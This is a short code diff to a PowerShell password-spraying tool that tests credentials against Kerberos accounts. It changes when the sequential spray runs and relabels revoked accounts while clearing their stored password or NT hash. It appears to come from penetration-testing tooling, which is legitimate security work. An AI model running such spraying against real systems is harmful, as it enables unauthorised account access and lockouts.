@@ -378,7 +378,7 @@ Function Invoke-PowerSpray {
         Verbose = $VerbosePreference
     }
 
-    if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1) {
+    if ($PSBoundParameters['Delay'] -or $credentials.Count -eq 1 -or $Threads -eq 1) {
         New-KerberosSpray @params -Collection $credentials
     }
     elseif ($credentials) {
@@ -514,7 +514,13 @@ Function Local:New-KerberosSpray {
                 }
                 # KDC_ERR_CLIENT_REVOKED
                 18 {
-                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Disabled'
+                    $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Revoked'
+                    if ($cred.Password) {
+                        $cred.Password = $null
+                    }
+                    elseif ($cred.NTHash) {
+                        $cred.NTHash = $null
+                    }
                 }
                 # KDC_ERR_KEY_EXPIRED
                 23 {
